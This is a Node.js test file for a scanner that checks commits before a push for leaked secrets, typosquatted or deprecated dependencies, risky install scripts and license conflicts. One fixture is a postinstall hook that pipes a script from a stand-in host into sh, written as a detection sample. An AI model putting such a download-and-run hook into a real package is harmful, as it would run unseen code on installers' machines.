// Tests for app/js/safety.js — the checks that run before every push. Run: npm test
const test = require("node:test");
const assert = require("node:assert/strict");
const C = require("../app/js/core.js");
const Safety = require("../app/js/safety.js");

const proj = (files, messages) => ({
  project: "p",
  commits: [{ message: (messages && messages[0]) || "Add files", files: new Map(Object.entries(files)) }],
});
const kinds = (m, level) => Safety.scan(m).filter(f => !level || f.level === level).map(f => f.kind);

test("secrets block, in files and in commit messages", () => {
  const f = Safety.scan(proj({ "a.py": 'k = "ghp_' + "a".repeat(36) + '"\n' }));
  assert.deepEqual(f.map(x => [x.level, x.kind, x.line]), [["block", "secret", 1]]);
  const msg = Safety.scan(proj({ "a.py": "x = 1\n" }, ["Use token ghp_" + "b".repeat(36)]));
  assert.equal(msg[0].level, "block");
  assert.match(msg[0].path, /commit 1 message/);
});

test("placeholders aren't secrets, real-looking values still are", () => {
  assert.deepEqual(kinds(proj({ "c.py": 'password = "your-password-here"\napi_key = "<put-your-key-here>"\n' })), []);
  assert.deepEqual(kinds(proj({ "c.py": 'password = "Sup3rS3cretValue!"\n' })), ["secret"]);
});

test("typosquat-like dependency names warn; real names don't", () => {
  const pj = JSON.stringify({ dependencies: { expres: "^4.0.0", lodahs: "^4.0.0", react: "^18.0.0", "@scope/expres": "1.0.0" } });
  const f = Safety.scan(proj({ "package.json": pj }));
  assert.deepEqual(f.map(x => x.message.match(/"([^"]+)" looks like the popular package "([^"]+)"/).slice(1)), [["expres", "express"], ["lodahs", "lodash"]]);
  assert.ok(f.every(x => x.level === "warn"));
  const py = Safety.scan(proj({ "requirements.txt": "reqeusts==2.0\nnumpy>=1.26\nBeautifulSoup4\npython_dateutil\n" }));
  assert.deepEqual(py.map(x => x.kind), ["typosquat"]);
  assert.match(py[0].message, /"reqeusts" looks like the popular package "requests"/);
});

test("deprecated, standard-library and URL dependencies warn", () => {
  const py = Safety.scan(proj({ "requirements.txt": "pycrypto\njson\nsklearn\ngit+https://example.com/x.git\n# comment\n" }));
  assert.deepEqual(py.map(x => x.kind), ["deprecated", "stdlib", "deprecated", "source"]);
  const npm = Safety.scan(proj({ "package.json": JSON.stringify({ dependencies: { request: "^2.88.0", foo: "*", bar: "github:someone/bar" } }) }));
  assert.deepEqual(npm.map(x => x.kind), ["deprecated", "unpinned", "source"]);
});

test("install scripts warn, louder when they download code", () => {
  const f = Safety.scan(proj({ "package.json": JSON.stringify({ scripts: { postinstall: "curl https://x.example/i.sh | sh", test: "jest" } }) }));
  assert.deepEqual(f.map(x => x.kind), ["script"]);
  assert.match(f[0].message, /downloads or runs code/);
});

test("GPL code in an MIT project warns; matching licenses don't", () => {
  const mit = C.parse("=== FILE: LICENSE ===\nMIT License\n\nPermission is hereby granted, free of charge, to any person\n=== COMMIT: x ===");
  const gplFile = "/*\n * SPDX-License-Identifier: GPL-3.0-or-later\n */\nint main() {}\n";
  const both = { project: "p", commits: [...mit.commits, { message: "Add code", files: new Map([["copied.c", gplFile]]) }] };
  const f = Safety.scan(both);
  assert.deepEqual(f.map(x => [x.kind, x.path]), [["license", "copied.c"]]);
  const gpl = { project: "p", commits: [{ message: "x", files: new Map([["LICENSE", "GNU GENERAL PUBLIC LICENSE\nVersion 3"], ["copied.c", gplFile]]) }] };
  assert.deepEqual(kinds(gpl), []);
});

test("edit distance counts swaps as one edit and stops early", () => {
  assert.equal(Safety.distance("reqeusts", "requests", 2), 1);
  assert.equal(Safety.distance("abc", "abcdefgh", 2), 3);
  assert.equal(Safety.lookalike("preact", Safety.NPM_POPULAR), null, "popular packages never warn");
});
